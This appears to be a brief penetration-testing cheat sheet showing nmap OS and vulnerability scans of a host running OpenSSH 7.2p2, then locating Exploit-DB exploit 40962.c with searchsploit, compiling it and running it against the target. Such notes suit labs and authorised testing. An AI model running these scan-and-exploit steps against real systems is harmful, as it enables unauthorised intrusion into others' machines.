nmap -O 10.1.1.1
```
Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-16 12:00
Nmap scan report for 10.1.1.1
Host is up (0.0010s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.1
```


nmap --script vuln 10.1.1.1
```
PORT    STATE   SERVICE
22/tcp  open    ssh
| vulners:
| cpe:/a:opebsd:openssh:7.2p2
|    CVE-2016-10009  7.5  https://vulners.com/cve/CVE-2016-10009
```

Install searchsploit program:
```
apt-get install exploitdb   or    brew install exploitdb   
searchsploit <service> <version>
```

searchsploit openssh 7.2
```
----------------------------------------- ----------------------------------------
 Exploit Title                           |  Path
----------------------------------------- ----------------------------------------
OpenSSH 7.2p1 - (Ubuntu 16.04.1) 'Accepted | /usr/share/exploitdb/exploits/linux/remote/40962.c
----------------------------------------- ----------------------------------------
```

#Copy the exploit:
```
cp /usr/share/exploitdb/exploits/linux/remote/40962.c .
gcc 40962.c -o openssh_exploit
./openssh_exploit 10.1.1.1 22
```

